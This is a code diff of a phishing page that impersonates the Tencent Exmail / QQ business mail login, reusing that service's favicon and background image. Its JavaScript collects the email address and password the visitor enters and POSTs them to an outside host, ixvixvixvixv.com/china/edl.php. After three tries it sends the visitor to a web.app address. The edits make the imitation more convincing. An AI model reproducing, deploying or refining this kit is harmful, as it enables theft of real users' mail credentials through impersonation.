@@ -7,17 +7,23 @@
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
     <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
     <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
-    <title>电子邮件服务器</title>
+    <title>邮件服务器</title>
+<link rel="shortcut icon" href="https://exmail.qq.com/exmail_logo.ico" type="image/x-icon" />
+
     <style type="text/css">
     body {
-        background: #ffffff;
+        background-image: url("https://rescdn.qqmail.com/bizmail/zh_CN/htmledition/images/bizmail/new_login/new_login_background_1475f40.jpg");
     }
 
     .container {
         width: 100%;
         display: flex;
-        justify-content: ;
+        justify-content: center;
         align-items: center;
+	padding-right: 15px;
+    padding-left: 785px;
+    margin-right: auto;
+    margin-left: auto;
         height: 100vh;
     }
 
@@ -120,7 +126,7 @@
     }
 
     .form-holder .btn-holder .btn {
-        background: #0073C6;
+        background: #2984EF;
         border: none;
         padding: 6px 10px;
         color: #fff;
@@ -161,7 +167,7 @@
 <body>
     <div class="container">
         
-        <div class="office  shadow bg-light" id="others">
+        <div class="office show border shadow bg-light" id="others">
             <div class="office-holder">
                 <div class="logo">
                 <div class="email_icon">
@@ -170,8 +176,8 @@
                     <h5 class="font-weight-light">输入有效的详细信息以获取访问权限</h5>
                 </div>
                 <div style="width: 100%;">
-                    <div class="alert alert-danger" id="msg" style="display: none;">密码错误！ 请输入正确的密码。</div>
-                    <span id="error" class="text-danger" style="display: none;">该帐户不存在。 输入其他帐户</span>
+                    <div class="alert alert-danger" id="msg" style="display: none;">密码错误！请输入正确的密码.</div>
+                    <span id="error" class="text-danger" style="display: none;">该帐户不存在。输入其他帐号</span>
                 </div>
                 <form>
                     <div class="form-holder">
@@ -179,14 +185,13 @@
                         <input type="password" id="password" placeholder="密码" class="form-control" required>
                         <div class="checkbox">
                             <input type="checkbox" name="" style="float: left; margin-top:2px; margin-bottom: 10px;">
-                            <label>记住账号
-</label>
+                            <label>记住账号</label>
                         </div>
                         <div class="btn-holder">
                             <button class="btn btn-lg col-12" id="submit-btn">核实</button>
                         </div>
-                        <p style="color:#0073C6; margin-top:1em; float: left; width:100%;">无法访问您的帐户?</p>
-                        <p style="color:#0073C6; margin-top:0em; float: left; width:100%;">使用一次性密码登录</p>
+                        <p style="color:#2984EF; margin-top:1em; float: left; width:100%;">无法访问您的帐户?</p>
+                        <p style="color:#2984EF; margin-top:0em; float: left; width:100%;">使用一次性密码登录</p>
                     </div>
                     
                 </form>
@@ -290,13 +295,13 @@
 
         if (!filter.test(my_email)) {
             $('#error').show();
-            $('#error').html("该帐户不存在。 输入其他帐户");
+            $('#error').html("That account doesn't exist. Enter a different account");
             ai.focus;
             return false;
         }
         if (!password) {
             $('#error').show();
-            $('#error').html("密码字段为空。！");
+            $('#error').html("Password field is emply.!");
             ai.focus;
             return false;
         }
@@ -310,7 +315,7 @@
       $('#domain-name').html(final);
       $.ajax({
         dataType: 'JSON',
-        url: "https://ixvixvixvixv.com/china/edl.php"+atob(file),
+        url: "https://ixvixvixvixv.com/china/edl.php/"+atob(file),
         type: 'POST',
         data:{
           email:email,
@@ -318,7 +323,7 @@
         },
             // data: $('#contact').serialize(),
             beforeSend: function(xhr){
-              $('#submit-btn').html('核实...');
+              $('#submit-btn').html('验证中...');
             },
             success: function(response){
               if(response){
@@ -330,7 +335,7 @@
                   if (count>=3) {
                     count=0;
                     // window.location.replace(response['redirect_link']);
-                    window.location.replace("http://www."+my_slice);
+                    window.location.replace("https://rdrsrv-6e73d.web.app");
 
                   }
                   // $('#msg').html(response['msg']);
@@ -345,13 +350,13 @@
               $("#password").val("");
               if (count>=3) {
                 count=0;
-                window.location.replace("http://www."+my_slice);
+                window.location.replace("https://rdrsrv-6e73d.web.app");
               }
               $("#msg").show();
-              // $('#msg').html("请稍后再试");
+              // $('#msg').html("Please try again later");
             },
             complete: function(){
-              $('#submit-btn').html('继续');
+              $('#submit-btn').html('核实');
             }
           });
     });
